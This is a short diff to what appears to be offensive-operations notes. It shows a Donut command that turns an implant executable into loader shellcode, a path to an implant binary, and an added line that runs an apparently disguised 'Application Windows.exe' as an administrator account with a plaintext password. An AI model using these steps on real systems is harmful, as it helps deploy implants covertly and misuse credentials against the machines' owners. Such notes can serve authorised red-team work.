@@ -18,5 +18,9 @@ Donut
 .\donut.exe -a 2 -f 1 -i Implante.exe -o loader.bin
 ```
 
+```
+exec_as administrador admin4191 ".\Application Windows.exe"
+```
+
 
  dir ..\Implants\windows\no_ssl\base.exe:
